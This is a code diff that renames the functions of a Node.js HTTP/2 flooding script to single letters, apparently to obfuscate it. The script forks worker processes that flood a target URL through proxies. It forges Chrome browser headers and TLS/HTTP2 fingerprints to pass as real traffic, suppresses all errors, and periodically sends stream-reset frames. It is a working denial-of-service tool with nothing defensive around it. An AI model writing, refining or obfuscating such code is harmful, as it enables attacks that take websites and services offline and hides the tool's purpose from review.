@@ -7,11 +7,11 @@ const fs = require('fs')
 const crypto = require('crypto');
 const HPACK = require('hpack');
 const os = require("os");
-const errorHandler = error => {
+const a = error => {
 };
-process.on("uncaughtException", errorHandler);
-process.on("unhandledRejection", errorHandler);
-function encodeFrame(streamId, type, payload = "", flags = 0) {
+process.on("uncaughtException", a);
+process.on("unhandledRejection", a);
+function b(streamId, type, payload = "", flags = 0) {
     const frame = Buffer.alloc(9 + payload.length);
     frame.writeUInt32BE(payload.length << 8 | type, 0);
     frame.writeUInt8(flags, 4);
@@ -19,7 +19,7 @@ function encodeFrame(streamId, type, payload = "", flags = 0) {
     if (payload.length > 0) frame.set(payload, 9);
     return frame;
 }
-function encodeSettings(settings) {
+function c1(settings) {
     const data = Buffer.alloc(6 * settings.length);
     for (let i = 0; i < settings.length; i++) {
         data.writeUInt16BE(settings[i][0], i * 6);
@@ -65,7 +65,7 @@ let sig = sigalgs.join(':');
 controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400']
 	, ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError']
 	, ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
-const headerFunc = {
+const n = {
 	cipher() {
 		return cplist[Math.floor(Math.random() * cplist.length)];
 	}
@@ -100,7 +100,7 @@ if (cluster.isMaster) {
 	for (let counter = 1; counter <= thread; counter++) {
 		cluster.fork();
 	}
-	const restartScript = () => {
+	const l = () => {
         for (const id in cluster.workers) {
             cluster.workers[id].kill();
         }
@@ -113,28 +113,28 @@ if (cluster.isMaster) {
         }, RESTART_DELAY);
     };
 
-    const handleRAMUsage = () => {
+    const m = () => {
         const totalRAM = os.totalmem();
         const usedRAM = totalRAM - os.freemem();
         const ramPercentage = (usedRAM / totalRAM) * 100;
 
         if (ramPercentage >= MAX_RAM_PERCENTAGE) {
             console.log('[!] Maximum RAM usage percentage exceeded:', ramPercentage.toFixed(2), '%');
-            restartScript();
+            l();
         }
     };
-	setInterval(handleRAMUsage, 5000);
+	setInterval(m, 5000);
 	setTimeout(() => process.exit(-1), time * 1000);
 } else {
-	setInterval(flood)
+	setInterval(d)
 }
 
-function flood() {
+function d() {
 	var parsed = new URL(target);
-	var cipper = headerFunc.cipher();
+	var cipper = n.cipher();
 	var proxy = proxyr.split(':');
 	
-	function randstra(length) {
+	function e(length) {
 		const characters = "0123456789";
 		let result = "";
 		const charactersLength = characters.length;
@@ -144,7 +144,7 @@ function flood() {
 		return result;
 	}
 
-	function randstr(minLength, maxLength) {
+	function f(minLength, maxLength) {
 		const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
 const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
 const randomStringArray = Array.from({ length }, () => {
@@ -155,8 +155,8 @@ return characters[randomIndex];
 return randomStringArray.join('');
 }
 
-	const randstrsValue = randstr(25);
-function generateRandomString(minLength, maxLength) {
+	const fsValue = f(25);
+function g(minLength, maxLength) {
 					const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
   const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
   const randomStringArray = Array.from({ length }, () => {
@@ -167,15 +167,15 @@ function generateRandomString(minLength, maxLength) {
   return randomStringArray.join('');
 }
 const hd = {}
- function getRandomInt(min, max) {
+ function h(min, max) {
   return Math.floor(Math.random() * (max - min + 1)) + min;
 }
            const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx"];
-const getRandomBrowser = () => {
+const i = () => {
     const randomIndex = Math.floor(Math.random() * browsers.length);
     return browsers[randomIndex];
 };
-const generateHeaders = (browser) => {
+const j = (browser) => {
     const versions = {
         chrome: { min: 144, max: 146 },
         safari: { min: 17, max: 18 },
@@ -265,8 +265,8 @@ const generateHeaders = (browser) => {
 
     return headers;
 };
-const browser = getRandomBrowser();
-const headers = generateHeaders(browser);
+const browser = i();
+const headers = j(browser);
 	const agent = new http.Agent({
 		host: proxy[0]
 		, port: proxy[1]
@@ -300,7 +300,7 @@ const headers = generateHeaders(browser);
 		, ALPNProtocols: ['h2', 'http/1.1']
 	, };
 
-	function createCustomTLSSocket(parsed, socket) {
+	function k(parsed, socket) {
     const tlsSocket = tls.connect({
 			...TLSOPTION
 			, host: parsed.host
@@ -316,7 +316,7 @@ const headers = generateHeaders(browser);
     return tlsSocket;
 }
 	connection.on('connect', function (res, socket) {
-    const tlsSocket = createCustomTLSSocket(parsed, socket);
+    const tlsSocket = k(parsed, socket);
     socket.setKeepAlive(true, 100000);
 
     // Chrome 146 HTTP/2 settings - exact from akamai fingerprint: 1:65536;2:0;4:6291456;6:262144
@@ -351,13 +351,13 @@ const updateWindow = Buffer.alloc(4);
     // Chrome 146 HTTP/2 SETTINGS frame: HEADER_TABLE_SIZE=65536, ENABLE_PUSH=0, INITIAL_WINDOW_SIZE=6291456, MAX_HEADER_LIST_SIZE=262144
     const frames = [
 Buffer.from(PREFACE, 'binary'),
-encodeFrame(0, 4, encodeSettings([
+b(0, 4, c1([
 [1, 65536],
 [2, 0],
 [4, 6291456],
 [6, 262144],
 ])),
-encodeFrame(0, 8, updateWindow)
+b(0, 8, updateWindow)
 ];
     client.on('connect', () => {
         client.ping((err, duration, payload) => {
@@ -373,7 +373,7 @@ encodeFrame(0, 8, updateWindow)
             const requests = [];
             let count = 0;
 
-                // Use exact Chrome 146 headers from generateHeaders
+                // Use exact Chrome 146 headers from j
                 const head = { ...headers };
                             
                 if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
@@ -416,13 +416,13 @@ encodeFrame(0, 8, updateWindow)
                 const flags = 0x1 | 0x4 | 0x8 | 0x20;
                 
                 
-                const encodedFrame = encodeFrame(streamId, 1, packed, flags);
+                const encodedFrame = b(streamId, 1, packed, flags);
                 
                 const frame = Buffer.concat([encodedFrame]);
                 if (streamIdReset >= 5 && (streamIdReset - 5) % 10 === 0) {
                 
                 tlsSocket.write(Buffer.concat([
-                  encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0),
+                  b(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0),
                   frames
                  ]));
 
